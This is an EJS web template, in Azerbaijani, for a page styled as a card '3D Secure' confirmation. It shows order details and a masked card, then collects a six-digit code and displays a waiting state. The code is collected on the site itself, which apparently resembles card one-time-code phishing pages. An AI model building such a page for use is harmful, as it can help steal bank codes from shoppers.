<section class="section">
  <div class="container">
    <div class="secure3d">
      <div class="secure3d__head">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/>
        </svg>
        <strong><%= t('secure3d.title') %></strong>
      </div>

      <div class="secure3d__body">
        <dl class="kv mb-16">
          <dt>Sifariş</dt><dd><%= order.orderNo %></dd>
          <dt>Kart</dt><dd class="mono"><%= cardMasked || '—' %></dd>
          <dt>Məbləğ</dt><dd class="mono"><%= order.total.toFixed(2) %> ₼</dd>
        </dl>

        <p class="sec-note mb-16"><%= t('secure3d.info') %></p>

        <% if (codeSubmitted) { %>
          <div class="alert alert--success">Kod göndərildi. Yekun təsdiq gözlənilir. <span class="pulse"></span></div>
          <div id="codeWait" data-order-id="<%= order._id %>"></div>
          <a href="/<%= locale %>/3d-tesdiq/<%= order._id %>" class="btn btn--outline btn--block"><%= t('common.loading') %></a>
        <% } else { %>
          <div id="formNote" class="hidden"></div>
          <form id="codeForm" data-order-id="<%= order._id %>">
            <div class="field">
              <label for="code"><%= t('secure3d.code') %></label>
              <input type="text" id="code" name="code" class="code-input" data-code inputmode="numeric" maxlength="6" placeholder="000000" required autofocus />
            </div>
            <button type="submit" class="btn btn--primary btn--block btn--lg"><%= t('secure3d.submit') %></button>
          </form>
        <% } %>

        <p class="sec-note mt-16 text-center"><%= t('secure3d.waiting') %></p>
      </div>
    </div>
  </div>
</section>
